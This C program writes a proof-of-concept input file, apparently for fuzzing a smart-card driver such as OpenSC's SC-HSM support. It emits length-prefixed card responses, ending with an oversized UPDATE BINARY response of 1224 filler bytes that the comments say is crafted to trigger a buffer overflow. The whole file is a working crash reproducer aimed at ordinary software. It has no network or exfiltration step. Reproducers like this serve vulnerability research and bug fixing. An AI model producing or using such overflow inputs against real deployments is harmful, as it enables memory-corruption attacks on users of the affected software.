#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Chunk 1: ATR (12 bytes)
    // Little-endian length: 0x0C 0x00 = 12
    fputc(0x0C, f); fputc(0x00, f);
    // 12-byte ATR that maps to SC-HSM driver
    fputc(0x3B, f);
    fputc(0x7F, f);
    fputc(0x96, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);
    fputc(0x00, f);

    // Chunk 2: SELECT FILE response (2 bytes SW)
    // Little-endian length: 0x02 0x00 = 2
    fputc(0x02, f); fputc(0x00, f);
    fputc(0x90, f); fputc(0x00, f);

    // Chunk 3: READ BINARY response (2 bytes SW)
    // Little-endian length: 0x02 0x00 = 2
    fputc(0x02, f); fputc(0x00, f);
    fputc(0x90, f); fputc(0x00, f);

    // Chunk 4: UPDATE BINARY response with crafted large length to trigger overflow
    // Little-endian length: 0xC8 0x04 = 1224 bytes
    fputc(0xC8, f); fputc(0x04, f);
    // Write 1224 bytes of dummy data (this will be copied into the buffer)
    for (int i = 0; i < 1224; i++) {
        fputc(0x41, f);
    }

    // Additional safe response chunks
    for (int i = 0; i < 10; i++) {
        fputc(0x02, f); fputc(0x00, f);
        fputc(0x90, f); fputc(0x00, f);
    }

    fclose(f);
    return 0;
}